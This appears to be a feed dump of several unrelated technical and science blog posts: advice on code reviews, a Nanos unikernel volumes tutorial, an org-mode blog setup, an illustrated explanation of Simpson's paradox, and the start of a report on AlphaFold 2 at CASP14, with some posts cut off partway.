                    <p>I put it straight – you do not need to have any prior knowledge about the codebase to start doing code reviews.</p><p>This article is going to be about why all new developers should review code, and how to get the most out of it. If you do not need any convincing or guidance, you may rather watch <a href="https://www.instagram.com/p/BwAa3I-hjkI/"><u>how I win a fight with my cat</u></a>.</p><blockquote>"New developers" in this context are not only people who have just started a career but also experienced developers working with the unfamiliar codebase.</blockquote><h2 id="benefits-of-doing-code-reviews">Benefits of doing code reviews</h2><p>First of all, it is going to speed up your onboarding. Right now, your learning is limited by the number of tasks you are directly involved in — you learn from your own successes and mistakes.</p><p>Reviewing other solutions is a quick way to get around this limit. You can get to know various parts of code without touching them personally and see what works and what does not for different types of problems.</p><p>On the other hand, your feedback will be beneficial to the team because you have a crucial trait that no one else has — fresh eyes with no prior context. <br>As writers cannot edit their own texts, programmers rarely can judge their code. We know too much about why it is written this way, and the more people share the same understanding, the harder it is to have an unbiased opinion. While you have limited knowledge, you are the only person who can give a fresh view and challenge what others take for granted.</p><h2 id="how-to-approach-code-reviews">How to approach code reviews</h2><h3 id="1-do-not-be-afraid">1. Do not be afraid</h3><p>All teams I worked with had a high demand for code reviews, which is quite common in the industry. Therefore, do not be afraid of starting — nobody will mind having one more pair of eyes available.</p><p>It is quite common to fear not catching a bug or merging code that would need some improvements. A workaround is simple — do not approve a pull request if you are not sure. Leave your comments, ask questions, and ping somebody else for a final verdict.</p><h3 id="2-understand-the-problem">2. Understand the problem</h3><p>Before looking closely at the code, familiarize yourself with the problem:</p><ul><li>What is the definition of done? </li><li>Is it complete? </li><li>Would you add anything else? </li><li>How would you test it?</li></ul><p>Think about all possible use-cases the author may need to implement. Then, either remember them or write them down — this is going to be handy soon.</p><h3 id="3-draft-your-own-solution">3. Draft your own solution</h3><p>Remember, we are not reading code yet :-)</p><p>To get the most from this learning opportunity, think about how you would approach this task:</p><ul><li>How to structure data?</li><li>Where to put logic?</li><li>Is there anything in the codebase you should reuse? If unknown, how would you search for it?</li><li>Who is more knowledgeable in this area to advise you if you were the one picking this task?</li></ul><p>Once again, write it down or keep in your memory — up to you.</p><h3 id="4-prove-that-the-problem-is-solved-fully">4. Prove that the problem is solved fully</h3><p>Now it is the time to start looking at implementation but only at a high-level. Focus on <em>what</em> rather than <em>how</em>.</p><p>Sometimes, clear and correct code does a wrong job:</p><ul><li>An author may misread or misinterpret requirements</li><li>They may implement some parts and forget the others</li></ul><p>Look at the list of possible use-cases you prepared earlier:</p><ul><li>Are all of them handled? <br>If not, ask whether they need to be — it is safe to assume that you are the one who misunderstood the problem.</li><li>Are there any cases you did not consider? <br>If the author implemented something you did not even think about, it is excellent — you already learned something new!</li></ul><h3 id="5-compare-your-solution-with-the-pull-request-">5. Compare your solution with the pull request.</h3><p>Now you know how you would approach this problem, but how did the author solve it?</p><p>Find differences between both approaches and try to understand the pros and cons of each. The best way to do it is to ask questions:</p><ul><li>Why was it preferred to put X and Y to the same database table, rather than keeping them separately?</li><li>Why was the primary logic put to module A, while module B has similar pieces that might be collocated?</li></ul><p>This way is how you learn the most — not by reading the code and checking it for correctness, but by exercising your skills and validating proposed solutions.</p><h3 id="6-ask-questions-about-code-">6. Ask questions about code.</h3><p>When you get the answers to all high-level questions, it is time to zoom in and look deeply at code:</p><ul><li>Is it easy to understand or something needs further clarification? <br>Questions from new developers often mean that the code is not as self-explanatory as it could be. The author may consider adding comments or restructuring obscure fragments.</li><li>Are there ways to improve the code? <br>Even though you're new to the project, you can read and write code, right? Leave a suggestion when you see a room for improvement — after all, it can only help.</li></ul><p>People frequently ask where is that line between giving useful comments and nitpicking. Is it appropriate to ask to rename a variable or to chase a negligible performance improvement?</p><p>As for me, everything is alright as soon as you communicate what is essential and what is not. I always prefix minor comments with the words 'minor' or 'nit', so the author knows which are ok to ignore.</p><h3 id="come-back-later">Come back later</h3><p>If the pull request was not immediately merged — make sure you check it for new comments later.</p><p>Someone may reject it despite your approval; someone may add fruitful comments — this is just another piece of context that is never superfluous.</p><hr><p>As always, you can <a href="https://evgenii.info/new-developer-do-code-reviews#subscribe"><u>subscribe to Resilient Systems</u></a> and receive new articles by email if you haven't done it yet. <br>You also can <a href="https://twitter.com/_elergy_"><u>find me on Twitter</u></a> or somewhere else – I am always happy to chat :-) </p>

<![CDATA[Working with Unikernel Volumes in Nanos]]>

Score 34 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25352718">thread link</a>) | @eyberg
<br/>
December 8, 2020 | https://nanovms.com/dev/tutorials/working-with-unikernel-volumes-in-nanos | <a href="https://web.archive.org/web/*/https://nanovms.com/dev/tutorials/working-with-unikernel-volumes-in-nanos">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <p>Today's article is about working with external volumes for your
unikernel instance. Many applications won't use this feature but there
are also situations where this makes sense.</p>

<p>The most obvious time when you would want to attach a volume to your
unikernel instance is when you are working with a database. Your
database image probably doesn't change that much but many databases can
grow very large and it makes no sense to keep the same data volume in
your base image.</p>

<p>The second use-case is when you have a base image, say a webserver,
and you want to package additional files or configuation as a build
step. For instance some companies will rotate certificates every few
hours in the day to protect access to various services and this rotation
is usually done out-of-band of deploys. Now unikernel deploys for small
webservers are typically fairly fast but the ability to put your
configuration on a separate partition and re-mount the volume on the fly
every few hours is definitely enticing.</p>

<p>Ok, let's start with the code. For this example we have a simple
little go webserver that implements a root filesystem filewalker. We've
declared that there is a separate partition called 'mnt' in the code but
it is non-existent right now.</p>

<pre><code>import (
  "fmt"
  "io/ioutil"
  "net/http"
  "os"
  "path/filepath"
)

func printDir() {
  err := filepath.Walk("/",
    func(path string, info os.FileInfo, err error) error {
      if err != nil {
        return err
      }
      fmt.Println(path, info.Size())
      return nil
    })
  if err != nil {
    fmt.Println(err)
  }
}

func main() {
  printDir()

  b, err := ioutil.ReadFile("/mnt/bob.txt")
  if err != nil {
    fmt.Println(err)
  }

  fmt.Println(string(b))

  http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    printDir()

    b, err := ioutil.ReadFile("/mnt/bob.txt")
    if err != nil {
      fmt.Println(err)
    }

    fmt.Println(string(b))
    fmt.Fprintf(w, "Welcome to my website!")
  })

  fs := http.FileServer(http.Dir("static/"))
  http.Handle("/static/", http.StripPrefix("/static/", fs))

  go func() {
    err = http.ListenAndServe(":80", nil)
    if err != nil {
      fmt.Println(err)
    }
  }()

  http.ListenAndServe(":8080", nil)
}
</code></pre><p>

If you run it locally you should see something like this:
</p><pre><code>➜  g2 ops run -p 8080 g2
booting /Users/eyberg/.ops/images/g2.img ...
assigned: 10.0.2.15

/sys/devices/system/cpu 0
/sys/devices/system/cpu/cpu0 0
/sys/devices/system/cpu/online 0
open /mnt/bob.txt: no such file or directory
</code></pre>

<h3>Creating a Volume</h3>

<p>Let's create a simple volume with one file in it - bob.txt.</p>

<pre><code>mkdir mnt
echo "Hi - I'm a text file" &gt; mnt/bob.txt
➜  g2 ops volume create mnt -d mnt
2020/12/08 11:12:35 volume: mnt created with UUID 04c56e4a-5b8b-512c-eaa3-b82b4cd46d9e and label mnt
</code></pre><p>

You'll see that we can now see it in our local volume store:

</p><pre><code>➜  g2 ops volume list

<h3>Attaching a Volume</h3>

<p>You can attach a volume to an instance that is expecting one. So that
means when we create the image we'll want to pass any mount points with
the volume label and mount path - this is loosely similar to how
something in /etc/fstab would work. Ran locally you can test with 'ops
run' but you can pass the same '--mounts' flag when issuing 'ops image
create' for images ran on Google or AWS. Let's try it out locally:
</p>

<pre><code>➜  g2 ops run -p 8080 g2 --mounts mnt:/mnt
booting /Users/eyberg/.ops/images/g2.img ...
assigned: 10.0.2.15

Hi - I'm a text file
</code></pre>

<p>Cool! It works! Now let's edit the file.</p>

<pre><code>echo "New text has come to light." &gt; mnt/bob.txt
➜  g2 ops volume create mnt2 -d mnt
2020/12/08 11:19:41 volume: mnt2 created with UUID f82da0e3-3980-ddd8-5720-e1b320e21371 and label mnt2
</code></pre>

<p>Keep in mind we are creating a *new* volume with new contents and then re-attaching the volume to the instance.</p>

<pre><code>➜  g2 ops run -p 8080 g2 --mounts mnt2:/mnt

</code></pre>

<p>If you are attaching the volume to an instance on Google or AWS you'd
use the attach command:</p>

<pre><code>ops volume attach g2 mnt mnt2 -t gcp -c config.json</code></pre>

<p>Similarly, you can detach as well:</p>

<pre><code>ops volume detach g2 mnt -t gcp -c config.json</code></pre>

<p>What's really great about unikernel volumes when working on AWS or
Google is that this is all managed for you by the cloud provider of choice. There is no duplicate storage layer
you have to manage like you do in container land. Now you know the basics of mounting external volumes into your unikernel images.</p>

I just finished<sup><a id="fnr.1" href="#fn.1">1</a></sup> building a new blog <a href="https://orgmode.org/">org-mode</a>. You're now looking at that blog (I should think). <a href="https://rakhim.org/honestly-undefined/19/">As is customary</a> for any new blog designed in a relatively obscure way, I shall attempt to justify my technical choices and also assemble a rough guide for you to build your own "blorg."
</p>
<div id="outline-container-org614ecaa">
<h2 id="org614ecaa">What Doesn't Work</h2>
<div id="text-org614ecaa">
<p>
This is the fourth or fifth blog I've constructed in the last few years. I used <a href="https://jekyllrb.com/">Jekyll</a> for quite some time, before moving to <a href="https://metalsmith.io/">Metalsmith</a> + <a href="https://pugjs.org/api/getting-started.html">Pug</a>, then <a href="https://www.netlifycms.org/">Netlify</a> + <a href="https://www.gatsbyjs.com/">GatsbyJS</a>, then finally <a href="https://ghost.org/">Ghost</a> hosted on a Google VPS before deciding to build my current system. I reached a point where I actually began to version my personal website, adhered to semver, and tagged releases on GitLab. I will try to explain, briefly, why each of these setups was either insufficient for my (relatively meager) needs, or just rubbed me the wrong way.
</p>
<dl>
<dt>Jekyll</dt><dd>In my opinion, Jekyll deserves its popularity. Few static site generators manage to have as low a barrier to entry as Jekyll has while avoiding cruft and slowness. However, this is also Jekyll's main flaw — there is very little you can <i>do</i> with Jekyll beyond write posts in Markdown, attach templates to them, and publish them as HTML. If all you plan on doing with your website is authoring simple posts and publishing them, and you want to do this efficiently, Jekyll is probably right for you. If you, like me, are never satisfied unless you can push the software you use to near-ludicrous limits, Jekyll is something you will outgrow very quickly. It is very difficult to use source formats other than Markdown with Jekyll — there are org-mode packages which claim to work, but, in my experience, they do not.</dd>
<dt>Metalsmith</dt><dd><p>
My search for extensibility led me to Metalsmith, which uses a rather complex mix of GNU makefiles and JSON for configuration and compilation. Metalsmith, if you are unfamiliar, provides a "black box" which you can connect arbitrary sources and destinations to. You can tell it that you'll hand it content in Markdown, HTML, Pug, and org-mode syntax, and that you want that content converted to HTML, and it will <i>just work</i> provided you have a proper plugin.
</p>
<p>
The main problem I had with Metalsmith is that it is extremely slow. My GitLab CI deployments would oftentimes take upwards of ten minutes to complete, which, as someone who likes to stare at deploy logs as they get produced, was annoying. Also, I made the error to begin by writing content in Pug, which is not a very good template engine and has poor support in editors. By the time I had a technical stack I was comfortable with, I had installed so many plugins that Metalsmith was struggling to cope. Eventually I decided that is was more worth my time to dump Metalsmith entirely and rewrite my content in something more focused.
</p></dd>
<dt>Netlify CMS</dt><dd>Admittedly I did not spend much time here — I was unable to get GitLab's default Gatsby setup to work with Netlify, even though they both advertise built-in support for each other. This may have been my fault, but I did spend some 20 or so hours fiddling with settings and configuration files to get it to work, to no avail.</dd>
<dt>Ghost</dt><dd><p>
Ghost is good software. It is the only WordPress competitor I have discovered which I would recommend to people with a straight face. I am actually currently building a large website for a client in Ghost, based partly on my experiences using it for my personal blog. It isn't as featured as WordPress, but it is <i>much</i> faster, more modern, and provides more out-of-the-box compared to WordPress's "There's a plugin for that" culture.<sup><a id="fnr.2" href="#fn.2">2</a></sup>
</p>
<p>
After a year of using Ghost, my GCP free trial expired and Google shut down my VPS. While I could have reinstalled Ghost onto a new system, I decided that it was time I returned to static hosting — I missed org-mode too much!

<h2 id="org28431ba">The Road to Org</h2>
<div id="text-org28431ba">
<p>
Org-mode, and Emacs in general, have absorbed aspects of my life in a roughly linear trajectory since I first discovered Emacs in 2012. I have an <a href="https://www.orgroam.com/">org-roam</a> database full of thousands of lines of my academic notes, notes on literature, journal entries, contacts, etc. Org's literate programming features simply have no peer right now. When I try to use any other markdown format, I'm uncomfortable at how barebones they all are. Painless export to HTML, LaTeX, presentations, etc. (even simultaneously), backporting of some of LaTeX's more seamless syntactical features to other export modes, the footnote syntax, table manipulation; all of these things I hate to live without and am increasingly finding myself unwilling to. So I decided I would use org-mode for my blog. But this means not using the watered-down org-mode "renderers" that exist on GitLab, GitHub, etc. — all of which are missing critical features, sometimes basic ones such as boldface. I need Emacs to do the heavy lifting.
</p>
<p>
I tried <a href="https://ox-hugo.scripter.co/">ox-hugo</a> but its setup was tedious to the point of absurdity. I started writing a generator to export org-mode files to <a href="https://www.getzola.org/">Zola</a>'s syntax, but this turned out to be equally too much work and not enough benefit. Without basing any generator on org-mode's extant output formats, some of org's strengths (such as execute-on-export for literate programming) vanish. Ox-hugo gets around this by exporting to markdown rather than building a novel Hugo front-end, but in my opinion this is not the right attitude to take towards building an Emacs-based blog. Org-mode already has an HTML exporter, why go through a less-featured middle-man?
</p>
<p>
That's how I arrived at <a href="https://orgmode.org/manual/Publishing.html">org-publish</a>, which is [1] built-in to org-mode, [2] supports all features and even allows for some custom configuration, and [3] is <i>extremely</i> simple.
</p>
</div>
</div>
<div id="outline-container-org082d001">
<h2 id="org082d001">Publishing from Org</h2>
<div id="text-org082d001">
<p>
To use org-publish, you simply assign a directory of "source" posts, a directory to export those posts to, and any settings you would like applied during translation. These settings are defined just like any other emacs settings, using Emacs Lisp in your configuration directory or a custom file. The tight integration with regular Emacs configuration means you have free reign to set up the system however you want — for example, I wrote a function which loads a deploy script (also written in Emacs Lisp) before calling org-publish. That script acts as a sort of makefile: calling <code>sassc</code> to compile my <a href="https://sass-lang.com/">Sass</a> files into CSS files and placing them in the proper directory, running <code>surge</code> with the proper settings to deploy the static files, etc. Org-publish includes a feature to generate a "sitemap" out of the box, which I use as my blorg's landing page.
</p>
<p>
Once that is set up, simply calling my function from anywhere in Emacs will publish (export), build (compile), and deploy my blog. No more waiting around for GitLab's CI to spin up; no more 100-commit days where syntax errors in obscure configuration formats brought down the runner, no more refreshing my home page every few seconds while guessing if Cloudflare is just taking awhile or if the deployment really broke (again). And Google won't shut off my server again.
</p>
<p>
For convenience, I'll include some snippets of the configuration I wrote here. However, I intended this setup to be deeply integrated with the rest of my Emacs workflow — I define blog posts with an org-capture, which I have bound to <code>C-c n c p</code>; a lot of my HTML configuration is defined globally rather than just for blog posts; etc. My entire Emacs configuration is hosted on GitLab<sup><a id="fnr.3" href="#fn.3">3</a></sup> and is publicly licensed, so you can take a peak at the monsters I've assembled if you'd like. For example, you can find the org-capture template <a href="https://gitlab.com/slondr/emacs-config/-/blob/master/org-templates/post.orgcaptmpl">here</a> and my general org configuration (including all of my configuration for org-publish) <a href="https://gitlab.com/slondr/emacs-config/-/blob/master/lib/org.el">here</a>; note the hard-coded fully-qualified filenames.<sup><a id="fnr.4" href="#fn.4">4</a></sup> Change that if you intend to remix what I've written.
</p>
<p>
My deploy script is in the root directory of the blog, and contains only two lines:
</p>
<div>
<pre><span>(</span>shell-command <span>"sassc -a src/sass/index.sass css/index.css"</span><span>)</span>
<span>(</span>shell-command <span>"surge public blog.ericlondr.es"</span><span>)</span>
</pre>
</div>
<p>
Again, note the use of fully-qualified absolute filenames. The key function in my global Emacs configuration is this:
</p>
<div>
<pre><span>(</span><span>require</span> '<span>ox-publish</span><span>)</span>
<span>(</span><span>defun</span> <span>blog-deploy</span> <span>()</span>
  <span>(</span><span>interactive</span><span>)</span>
  <span>(</span><span>let</span> <span>(</span><span>(</span>wd default-directory<span>)</span><span>)</span>
    <span>(</span>org-publish-all<span>)</span>
    <span>(</span>cd <span>"~/org/blog/"</span><span>)</span>
    <span>(</span>load-file <span>"deploy.el"</span><span>)</span>
    <span>(</span>cd wd<span>)</span><span>)</span><span>)</span>
</pre>
</div>
<p>
<code>blog-deploy</code> publishes the blog and then runs the deploy script, returning Emacs's session to the proper working directory afterwards.
</p>
<p>
Take note that there is nothing special about the deploy script. It doesn't <i>need</i> to be Emacs Lisp, I just decided I liked it like that. You could write a makefile, or use some other scripting languages such as bash or Python or even Rust, or include the deployment commands in the <code>blog-deploy</code> function (once the directory is set). That's one of the beauties of this setup — the ecosystem is completely divorced from the static file generation, so any additional configuration or compilation steps you want to do you can just script yourself.
</p>
<p>
The capture template I use for starting off new posts is this:
</p>
<div>
<pre><span>#+title:</span> <span>%^</span><span>{</span><span>Name</span><span>}</span>
<span>#+date:</span> <span>%t</span>
<span>#+subtitle: Published: </span><span>{</span><span>{</span><span>{</span><span>date</span><span>}</span><span>}</span><span>}</span>
<span>#+setupfile: /home/eric/org/blog/org-template/style.org</span>

%?
</pre>
</div>
<p>
When you run org-capture and call this template, it will ask you first for the slug (filename), and then for the title ("Name"). The date will be automatically inserted. To render the dates as I have, eg in this post, customize <code>org-time-stamp-custom-formats</code> and then run <code>C-c C-x C-t</code> in the new buffer. The setupfile listed here will be included verbatim when org-publish converts the file to HTML. My setup file is very basic, but it would be difficult to accomplish this using other features:
</p>

<p>
This loads my site CSS and preferred webfont in each HTML page. It's infeasible to include this in the capture template, because the capture template will not apply to the sitemap (index.html).
</p>
<p>
That's pretty much it. Beyond some specific customizations of HTML flavor and export options, that's more or less all you need to get a robust yet simple blog built in Emacs. I tried to …</p></div></div></div></div>

            <p>It’s hard to get into Oxford. Is it easier if your parents are rich?</p>

<table>

<p>In 2013, <a href="https://www.theguardian.com/education/2013/aug/14/oxford-university-private-a-level">The Guardian</a> showed that students from expensive independent schools were accepted more often than students from state schools. If you limit things to just students with strong grades (3 A* at A-level) the bias reduces, but doesn’t disappear.</p>

<p><a href="https://theconversation.com/hard-evidence-is-oxford-biased-against-state-students-18979">The Conversation</a> later checked noticed something important: It’s <a href="https://www.ox.ac.uk/sites/files/oxford/Annual%20Admissions%20Statistical%20Report%202020.pdf">much easier</a> to get into Oxford if you apply to Classics (45% accepted) rather than Medicine (21%). If <em>each department</em> admits at equal rates, you’ll still have the appearance of an <em>overall</em> bias, if state students are more likely to apply to Medicine.</p>

<hr>

<p>Simpson’s paradox is the name for situations like this, where the same data can seem to tell entirely different stories. Most people think of the paradox as an odd little curiosity, or perhaps just a cautionary tale about interpreting data correctly.</p>

<p>But you shouldn’t see Simpson’s paradox like that. Rather than a little quirk, it’s actually a manifestation of a deeper and much stranger issue. It’s less about the “right” way to analyze data and more about the limits to what questions data can answer.</p>

<p>How does Simpson’s paradox work? What is this deeper issue? You don’t need to be a data scientist to understand all this. In this post, I’ll illustrate both Simpson’s paradox and the issues beneath it using a little cartoon about lighting bolts and farm animals. This will use no statistics and (basically) no math.</p>



<p>Imagine that you are a mortal shephard living near Olympus with a flock of sheep and <a href="https://dyno-might.github.io/2020/09/17/making-the-monty-hall-problem-weirder-but-obvious/">goats</a>.  Your neighbor, the thunder god Zeus, is a jerk. He has started zapping your animals with lightning bolts.</p>

<p><img src="https://dyno-might.github.io/img/simpson/zeus.png" alt="zeus"></p>

<p>He’s not trying to kill them; He’s just bored. (Transforming into animals to <a href="https://en.wikipedia.org/wiki/Zeus#Transformation_of_Zeus">seduce love interests</a> gets old eventually.)</p>

<p>Anyway, you wonder: Does Zeus have a preference for shooting sheep or goats? You decide to keep records for a year. You have 25 sheep and 25 goats, so you use a 5x5 grid with one cell for each animal.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats1.png" alt="sheep v goats 1"></p>

<p>At first glance, it seems like Zeus dislikes goats more than He dislikes sheep. (If you’re worried about the difference being due to random chance, feel free to multiply the number of animals by a million.)</p>



<p>Thinking about it, it occurs to you that some animals have darker fur than others. You go back to your records and mark each animal accordingly.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats2.png" alt="sheep v goats 2"></p>

<p>You re-do the analysis, splitting the animals into dark and light groups.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats3.png" alt="sheep v goats 3"></p>

<p>Overall, sheep are zapped less often than goats. But dark sheep are zapped <em>more</em> often than dark goats (7⁄11 &gt; 10⁄16) <em>and</em> light sheep are zapped more often than light goats (5⁄14 &gt; 3⁄9). This is the usual <em>paradox</em>: The conclusion changes when you switch from analyzing everyone to analyzing subgroups.</p>

<p>How does that reversal happen? It’s simple: For both sheep and goats, dark animals get zapped more often, and there are more dark goats than dark sheep. Dark sheep are zapped slightly more than dark goats, and light sheep are capped more than light goats. But dumping all the animals together changes the conclusion because there are so many <em>more</em> dark goats. This is an example of Simpson’s paradox. Group-level differences can be totally different than subgroup differences when the ratio of subgroups varies.</p>

<p>If you just want to understand Simpson’s paradox you’re done! This probably seems like a weird little edge case so far. But let’s continue.</p>



<p>Thinking even more, you notice that many of your (apparently mutant) animals have stripes. You prepare the data again, marking each animal according to stripes, rather than color.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats4.png" alt="sheep v goats 4"></p>

<p>You wonder, naturally, what happens if you analyze these groups.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats5.png" alt="sheep v goats 5"></p>

<p>The results are similar to those with color. Though sheep are zapped less often than goats overall (12⁄25 &lt; 13⁄25), plain sheep are zapped more often than plain goats (5⁄14 &gt; 3⁄9), and striped sheep are zapped more often than striped goats (7⁄11 &gt; 10⁄16).</p>



<p>Of course, instead of just considering either color or stripes, nothing stops you from considering both.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats6.png" alt="sheep v goats 6"></p>

<p>You decide to consider all four subgroups separately.</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats7.png" alt="sheep v goats 7"></p>

<p>Now sheep are zapped <em>less</em> often in each subgroup. (1⁄4 &lt; 2⁄7, 6⁄7 &lt; 8⁄9, etc.)</p>

<p>When you compare everyone, there’s a bias against goats. When you compare by color, there’s a bias against sheep. When you compare by stripes, there’s also a bias against sheep. Yet when you compare by both color <em>and</em> stripes, there’s a bias against goats again.</p>

<p>The same data gives lots of different results! How can this happen?</p>

<p>To answer that, it’s important to realize that <em>anything can happen</em>. When you split data into subgroups, it’s possible to find any biases. These could reverse (or not) when you split those subgroups again. In the table above, <em>any</em> sequence of goats / sheep is possible in the right-hand column.</p>

<p>But <em>how</em>, you ask? <em>How</em> can this happen? I think this is the wrong question. Instead we should ask if there is anything to <em>prevent</em> this from happening. There are a huge variety of possible datasets, with all sorts of different group averages. Unless there is some special structure forcing things to be “orderly”, essentially arbitrary stuff can happen. There is no special force here.</p>



<p>So far, this all seems like a lesson about finding the right way to analyze data. In some cases, that’s probably true. Suppose read that Prestige Airways is more often delayed than GreatValue Skybus. Looking closer, you notice that Prestige flies mostly between snowy cities while Skybus mostly flies between warm dry cities. Prestige may have a better track record for <em>all</em> individual routes, but a worse track record overall, simply because they fly difficult routes more often. In this case, it’s probably correct to say because Prestige is better for any flight you might take, Prestige is more reliable.</p>

<p>But in other cases, the lesson should be just the opposite: There <em>is</em> no “right” way to analyze data. Often the real world looks like this:</p>

<p><img src="https://dyno-might.github.io/img/simpson/sheep_v_goats8.png" alt="sheep v goats 8"></p>

<p>There’s no clear dividing line between “dark” and “light” animals. Stripes can be dense or sparse, thick or thin, light or dark. There can be many dark spots or few light spots. This list can go on forever. In the real world, individuals often vary in so many ways that there’s no obvious definition of subgroups. In these cases, you can’t beat the paradox. To get answers, you have to make arbitrary choices, even though the answers will depend on the choices you make.</p>

<p>Arguably this is a <em>philosophical</em> problem as much as a statistical one. We usually think about bias in terms of “groups”. If prospects vary for two “otherwise identical” individuals in two groups, we say there is a bias. This made sense for the airlines above: If Prestige was more often on time than GreatValue for each route, it’s fair to say Prestige is more reliable.</p>

<p>In a world of <em>individuals</em>, this definition of bias breaks down. Suppose Prestige mostly flies in the middle of the day on weekends in winter, while Skybus mostly flies at night during the week in summer. They vary from these patterns, but never enough that they are flying the same route on the same day at the same time at the same time of year. If you want to compare the two, you can group flights by cities or day or time or season, but not all of them. Different groupings (and sub-groupings) can give different result. There simply is no right answer.</p>

<p>This is the endpoint of Simpson’s paradox: Group level differences often really <em>are</em> misleading. You can try to solve that by accounting for variability within groups, and there are lots of complex ways to try to do that I haven’t talked about. However, none of them solve the fundamental problem that it’s not clear what bias means when every individual is unique.</p>

<p>So by all means, beware of Simpson’s paradox. Try splitting your data and see what happens. But keep in mind that you might be trying to estimate a quantity that’s not defined. No data will solve that problem for you.</p>

Neither the Oxford Protein Informatics Group nor I accept any responsibility for the content of this post.</em></p>



<p>You might have heard it from the <a href="https://www.nature.com/articles/d41586-020-03348-4">scientific</a> or <a href="https://www.nytimes.com/2020/11/30/technology/deepmind-ai-protein-folding.html">regular press</a>, perhaps even from <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">DeepMind’s own blog</a>. Google ‘s AlphaFold 2 indisputably won the <a href="https://predictioncenter.org/casp14/index.cgi">14<sup>th</sup> Critical Assessment of Structural Prediction</a> competition, a biannual blind test where computational biologists try to predict the structure of several proteins whose structure has been determined experimentally — yet not publicly released. Their results are so incredibly accurate that many have hailed this code as the solution to the long-standing protein structure prediction problem.</p>



<p>Protein structure is at the core of biochemistry, and has profound implications for medicine and technology. Establishing the structure of a protein is a bottleneck in <a href="https://en.wikipedia.org/wiki/Drug_design#Structure-based">structure-based drug discovery</a>, and accurate structure prediction is expected to improve the productivity of pharmaceutical research pipelines (although it is only one factor, and we will need to get other things right before truly revolutionary changes happen — check Derek Lowe’s posts <a href="https://blogs.sciencemag.org/pipeline/archives/2019/09/25/whats-crucial-and-what-isnt">here</a> and <a href="https://blogs.sciencemag.org/pipeline/archives/2020/12/01/the-big-problems">here</a>). Structural information of proteins is also essential in biology, where it helps to elucidate function — many key papers in biochemistry derive insight from experimental advances in structure determination. </p>



<p>Given the importance of the problem, and the wide network of resources that have slowly been advancing for decades, I think nobody was expecting that a solution would be presented too quickly. I myself decided to focus my PhD research in the field of structure prediction, thinking like many others that several years of work across many research lines would be necessary before we could achieve something close to a solution. I may now need to change topics.</p>



<p>How much of the press release is true, what has actually happened, and how significant is it? There has been endless discussion about this topic in multiple forums. Frankly, I haven’t been able to think about anything else for the past 72 hours. In an attempt to clear my own thoughts, I have decided to write this blog post detailing everything I have learned since my scientific world was turned upside down around 3 pm GMT on Monday. I hope this is useful for my fellow protein bioinformaticians who could not attend CASP14, but also to anyone who wants to hear a little bit more about this topic.</p>



<p>Please bear in mind that my report of the CASP14 assessment and conference will necessarily be interspersed with conjecture. The details of how <a href="https://deepmind.com/blog/article/alphafold-a-solution-to-a-50-year-old-grand-challenge-in-biology">AlphaFold 2</a> works are still unknown, and we may not have full access to them until their paper is peer-reviewed (which may take more than a year, based on their CASP13 paper). The magnitude of the breakthrough is undeniable — but we need more details to gauge its potential impact.</p>



<p>This is going to be a long post. Don’t say I didn’t warn you.</p>



<h2>How good is AlphaFold 2, exactly?</h2>



<p>Astoundingly so.</p>



<p>Let me tell you the story as it happened last Monday. A handful of hours before the start of the CASP14 meeting — around noon GMT — the organisers released the results of the assignment. Almost immediately, comments started to circulate around Twitter. This is the image everyone was sharing:</p>

One group, 427, named AlphaFold 2, shows an incredible improvement with respect to the second best group, 473 (BAKER). This figure was obtained from the official CASP14 webpage on Tuesday 1st December, 2020.</figcaption></figure></div>



<p>This bar plot describes the sum of <a href="https://en.wikipedia.org/wiki/Standard_score">Z-scores</a> representing the predictions from the different groups. Remember that the Z-score is just the difference of a sample’s value with respect to the population mean, divided by the standard deviation; a high value represents a large deviation from the mean, and is commonly used as a outlier detection procedure. In other words, the groups that are markedly better than the average will have larger Z-scores. In this graph we see that one group performs a lot better than the rest: Group 427, whose average Z-score was around 2.5 when considering all targets, and rose to 3.8 in the hardest ones. If this was an intelligence test, AlphaFold 2 would score an <a href="https://en.wikipedia.org/wiki/Intelligence_quotient">intelligence quotient</a> (IQ) above 160.</p>



<p>If the relative comparison is astounding, the actual performance is just as impressive. I am going to consider a typical metric in structural biology, the <a href="https://en.wikipedia.org/wiki/Root-mean-square_deviation_of_atomic_positions">root-mean-square deviation (RMSD) of atomic positions</a>. If you are not much of a protein folder, these numbers may not say much to you. Don’t worry — in next section I will show a few graphical examples. Just keep in mind that (1) a lower RMSD represents a better predicted structure, and that (2) most experimental structures have a resolution around 2.5 Å (<strong>updated 8th Dec:</strong> although, as many have pointed out in Twitter, this is an apples to oranges comparison). Taking this into consideration, about a third (36%) of Group 427’s submitted targets were predicted with a root-mean-square deviation (RMSD) under 2 Å, and 86% were under 5 Å, with a total mean of 3.8 Å.</p>

<p>We were still digesting this information when the conference started and, oh boy, did we suffer the first half an hour. Claims that this year’s competition was “a little unusual” were followed by suggestions that one particular group had produced impressive results. Finally, John Moult, who has chaired every CASP since 1994, masterfully delivered a nail-biting exposition of the history of the competition, slowly feeding us information until he finally showed the graph we were all expecting. Here it is:</p>



